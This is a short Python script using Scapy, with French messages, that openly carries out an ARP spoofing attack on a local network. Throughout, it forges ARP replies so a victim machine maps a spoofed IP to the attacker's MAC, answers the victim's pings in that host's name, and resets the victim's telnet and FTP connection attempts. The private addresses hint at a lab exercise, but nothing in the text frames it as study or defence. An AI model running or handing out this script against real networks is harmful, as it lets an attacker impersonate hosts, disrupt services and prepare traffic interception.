from scapy.all import *

spoofedIP = "192.168.22.200"
victim = "192.168.22.9"
MaliciousICMPseq = 2212
MaliciousICMPdata = 'ping malicieux'

print('Identification adresse MAC locale')
packet = Ether(dst='ff:ff:ff:ff:ff:ff')/IP(dst=spoofedIP)
MyMac = packet[Ether].src

print('Préparation de l\'attaque')
packet = Ether(src=MyMac, dst="ff:ff:ff:ff:ff:ff")/ARP(hwlen=6,plen=4,op=1,hwsrc=MyMac,psrc=spoofedIP,pdst=victim)
answer = srp1(packet, timeout=1, verbose=False)

if answer is None :
	print("Check : %s is down or unused." + victim)
	sys.exit()
MacVictim = answer.src
print('ARP:'+ victim,'indentifiée -'+ MacVictim)

packet = Ether(src=MyMac, dst=MacVictim)/IP(src=spoofedIP, dst=victim)/ICMP(type=8,code=0,id=0,seq=MaliciousICMPseq)/MaliciousICMPdata
answer = srp1(packet, timeout=1, verbose=False)

if answer is None :
	print('ICMP : pas de réponse de'+ victim)
	sys.exit()
if answer.haslayer(ICMP) is True and answer[IP].src ==  victim and answer[IP].dst == spoofedIP and answer[ICMP].type == 0 and answer[ICMP].seq == MaliciousICMPseq:
	print('ICMP : Succes !')
else:
	print('ICMP : réponse incorrecte de'+victim)
	sys.exit()

print("Attaque ARP Spoofing en cours .")
print("Attaque ARP Spoofing en cours ..")
print("Attaque ARP Spoofing en cours ...")

def PacketHandler(p):
	if p.haslayer(ARP) is True:
		if p[ARP].op ==  1 and p[ARP].psrc == victim and p[ARP].pdst == spoofedIP:
			#Requete ARP à laquelle il faut rep
			print('A', end='.',flush=True)
			a = Ether(src=MyMac, dst=p[ARP].hwsrc)/ARP(hwlen=p[ARP].hwlen, plen=p[ARP].plen, op=2, hwsrc=MyMac, psrc=spoofedIP, hwdst=p[ARP].hwsrc, pdst=p[ARP].psrc)
			sendp(a, verbose=False)
	if p.haslayer(ICMP) is True:
		if p[IP].src == victim and p[IP].dst == spoofedIP and p[ICMP].type == 8:
			#Requete ICMP Echo à lequelle il faut rep
			print('I', end='.',flush=True)
			a =Ether(src=MyMac, dst=MacVictim)/IP(src=spoofedIP, dst=victim)/ICMP(type=0,id=p[ICMP].id, seq=p[ICMP].seq)/p[Raw].load
			sendp(a, verbose=False)

	if p.haslayer(TCP) is True:
		if p[IP].src == victim and p[IP].dst == spoofedIP and p[TCP].flags == 2 and (p[TCP].dport == 23 or p[TCP].dport ==  21):
			a = Ether(src=MyMac, dst=MacVictim)/IP (src=spoofedIP, dst=victim)/TCP(sport=p[TCP].dport, dport= p[TCP].sport, ack=p[TCP].seq+1, flags=20, window=p[TCP].window)
			sendp(a,verbose=False)

bpf = "ether src " + MacVictim
sniff(filter=bpf, prn=PacketHandler)
print("Bye !")
